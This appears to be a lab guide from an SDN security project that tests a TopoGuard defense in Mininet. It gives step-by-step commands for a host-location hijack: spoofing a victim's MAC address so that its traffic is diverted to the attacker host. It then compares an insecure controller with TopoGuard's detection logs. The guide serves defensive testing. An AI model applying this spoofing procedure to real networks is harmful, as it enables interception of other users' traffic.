# Host Location Hijacking Attack Test (Manual First)

This guide shows how to run a host-location hijacking (MAC move spoof) attack manually against:

1. `insecure_baseline_ryu.py` (expected to accept the spoof silently)
2. `topoguard_ryu.py` (expected to detect and log host-move violations)

## Test Setup

Use two terminals from `topoguard-ryu`:

- Terminal A: controller (`ryu-manager ...`)
- Terminal B: Mininet (`sudo python3 topology.py`)

Topology used:

- `h1`, `h2` on `s1`
- `h3` on `s2`
- Victim identity: `h2` (`10.0.0.2`, `00:00:00:00:00:02`)
- Attack source: `h1` spoofing victim MAC

## 1) Manual Test on Insecure Baseline

### Terminal A (controller)

```bash
ryu-manager insecure_baseline_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside Mininet CLI, run:

```bash
# Warm up learning state so controller knows victim identity on h2's port
h2 ping -c 2 10.0.0.3

# Keep victim IP->MAC deterministic during checks
h3 arp -s 10.0.0.2 00:00:00:00:00:02

# Pre-attack reachability
h3 ping -c 3 10.0.0.2

# Host-location hijack: h1 spoofs h2 MAC
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up

# Emit spoofed traffic so controller relearns victim MAC on h1's port.
# (This ping may show "Destination Host Unreachable"; that is acceptable.)
h1 ping -c 5 -i 0.2 10.0.0.3

# Flush dataplane flows so forwarding is recomputed from current MAC location
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"

# Prove where victim-bound packets actually arrive:
# capture ICMP on both candidate receiver hosts.
h1 timeout 12 tcpdump -nn -i h1-eth0 'icmp and host 10.0.0.3' >tmp/h1_icmp.log 2>&1 &
h2 timeout 12 tcpdump -nn -i h2-eth0 'icmp and host 10.0.0.3' >tmp/h2_icmp.log 2>&1 &

# Send packets destined to victim identity (10.0.0.2 / MAC ...:02)
h3 ping -c 5 10.0.0.2
```

### Expected Output (Baseline)

- `pre` (before spoof): low packet loss (usually `0%`).
- `post` (after spoof): ICMP echo requests for victim `10.0.0.2` appear on `h1` capture (attacker) instead of `h2` capture (victim), proving host-location hijack/misdirection.
- No host-move security violation log is produced (baseline has no TopoGuard host-move checks).

Exit Mininet with `exit`, then clean up before the next run:

```bash
sudo mn -c
```

Stop the controller in Terminal A with `Ctrl+C`.

## 2) Manual Test on TopoGuard

### Terminal A (controller)

```bash
ryu-manager topoguard_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside Mininet CLI, run the same sequence:

```bash
# Warm up learning state
h2 ping -c 2 10.0.0.3
h3 arp -s 10.0.0.2 00:00:00:00:00:02
h3 ping -c 3 10.0.0.2

# Same host-location hijack attempt
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up
# Same note: this ping can fail, but still emits spoofed source-MAC traffic.
h1 ping -c 5 -i 0.2 10.0.0.3

# Recompute forwarding from fresh packet-ins
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"

# Prove actual receiver with packet capture
h1 timeout 8 tcpdump -nn -i h1-eth0 'icmp and host 10.0.0.3' >/tmp/h1_icmp.log 2>&1 &
h2 timeout 8 tcpdump -nn -i h2-eth0 'icmp and host 10.0.0.3' >/tmp/h2_icmp.log 2>&1 &
h3 ping -c 5 10.0.0.2
h1 grep -c "ICMP echo request" /tmp/h1_icmp.log
h2 grep -c "ICMP echo request" /tmp/h2_icmp.log
```

### Expected Output (TopoGuard)

- `pre` (before spoof): low packet loss (usually `0%`).
- Packet captures still show whether victim-bound packets were diverted to attacker host.
- TopoGuard logs host-move violation(s), for example:

```text
Violation: Host Move from switch ... port ... without Port ShutDown
```

- This implementation focuses on detection/alerting for host-location hijacking attempts; compare behavior by checking violation logs.

## 3) Automated Check (TopoGuard Detection)

`safety_check.py` already includes a host-move/MAC-spoof step and verifies violations are logged:

```bash
sudo python3 safety_check.py
```

Expected final output:

```text
result=PASS
observed=LLDP host-port + host-move violations
```
